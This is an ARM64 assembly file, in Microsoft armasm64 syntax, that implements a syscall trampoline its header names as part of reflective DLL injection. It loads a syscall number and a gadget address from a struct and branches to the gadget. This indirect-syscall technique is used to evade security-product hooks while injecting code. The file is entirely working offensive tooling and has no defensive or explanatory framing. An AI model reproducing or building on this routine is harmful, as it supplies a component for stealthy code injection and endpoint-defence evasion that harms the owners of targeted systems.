;
; ARM64 Syscall Trampoline for Reflective DLL Injection
; Microsoft ARM64 Assembler (armasm64.exe) syntax.
;
    AREA    |.text|, CODE, READONLY, ALIGN=3
    EXPORT  DoSyscall

DoSyscall
    ; Preserve callee-saved register x19 and the link register x30
    STP     x19, x30, [sp, #-16]!

    ; The C wrapper called us. x0 holds pSyscall. Save it.
    MOV     x19, x0

    ; The syscall convention requires arguments in x0-x7. The C wrapper passed
    ; our target arguments in x1-x7. We shift them left by one register.
    MOV     x0, x1
    MOV     x1, x2
    MOV     x2, x3
    MOV     x3, x4
    MOV     x4, x5
    MOV     x5, x6
    MOV     x6, x7

    ; Load the syscall number from the Syscall struct into x8
    LDR     w8, [x19, #8]

    ; Load the address of the syscall gadget from pSyscall->pStub
    LDR     x10, [x19, #16]

    ; Branch With Link to Register, calling the gadget.
    BLR     x10

    ; The syscall's return value is now in x0.

    ; Restore the saved registers
    LDP     x19, x30, [sp], #16

    ; Return to the C caller
    RET

    ALIGN
    END